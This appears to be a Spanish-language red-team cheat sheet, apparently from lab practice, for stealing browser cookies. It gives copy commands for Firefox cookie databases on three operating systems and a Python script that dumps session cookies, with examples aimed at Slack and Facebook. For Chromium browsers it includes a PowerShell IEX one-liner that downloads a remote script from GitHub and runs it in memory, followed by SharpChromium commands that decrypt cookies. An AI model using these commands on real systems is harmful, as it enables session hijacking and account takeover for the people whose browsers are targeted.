# Cookie Extraction

## Firefox
- En windows: `copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
- En ubuntu: `cp ~/.mozilla/firefox/*.default-release/cookies.sqlite .`
- En mac os: `cp ~/Library/Application\ Support/Firefox/Profiles/*.default-release/cookies.sqlite .`


```python
#!/usr/bin/env python3
# Sample Script to extract cookies offile from FireFox sqlite database 
# Created by PlainText 

import argparse
import sqlite3

def main(dbpath, host, cookie):
	conn = sqlite3.connect(dbpath)
	cursor = conn.cursor()

	if (host == "" and cookie == ""):
		query = "SELECT * FROM moz_cookies"
	elif (host != "" and cookie == ""):
		query = "SELECT * FROM moz_cookies WHERE host LIKE '%{}%'".format(host)
	elif (host == "" and cookie != ""):
		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%'".format(cookie)
	elif (host != "" and cookie != ""):
		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%' AND host LIKE '%{}%'".format(cookie, host)

	cursor.execute(query)
	records = cursor.fetchall()
	rowCount = len(records) 

	if (rowCount > 0):
		for row in records:
			print(row)
	else:
		print("[-] No cookie found with the selected options.")

	conn.close()

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("--dbpath", "-d", required=True, help="The path to the sqlite cookies database")
	parser.add_argument("--host", "-o", required=False, help="The host for the cookie", default="")
	parser.add_argument("--cookie", "-c", required=False, help="The name of the cookie", default="")
	args = parser.parse_args()
	main(args.dbpath, args.host, args.cookie)
``` 

### Ejemplo de extracción de cookies
- Ejemplo con slack:
    - `$ python3 cookieextractor.py --dbpath /home/kali/Desktop/htb/cookies.sqlite --host slack --cookie d`
- Ejemplo con facebook:
    - `$ python3 cookieextractor.py --dbpath /home/kali/Desktop/htb/cookies.sqlite --host facebook --cookie c_user`
- Ejemplo con todas las cookies:
    - `$ python3 cookieextractor.py --dbpath /home/kali/Desktop/htb/cookies.sqlite`

## Chromium-based browsers
- La diferencia entre firefox y chromium es que los valores de las cookies en chromium están encriptados.
- Para conseguir los valores podemos utilizar SharpChromium
    - [SharpChromium](https://github.com/djhohnstein/SharpChromium)
    - También existe una versión de powershell de este proyecto [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1)
    - `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')`
    - `Invoke-SharpChromium -Command "cookies slack.com"`
    - otro ejemplo: `Invoke-SharpChromium -Command "cookies facebook.com"`
- **Para compilar el proyecto se necesita visual studio IDE + .NET instalado, CTRL + SHIFT + B para compilar**
- En la carpeta del proyecto /bin/Debug se encuentra el ejecutable.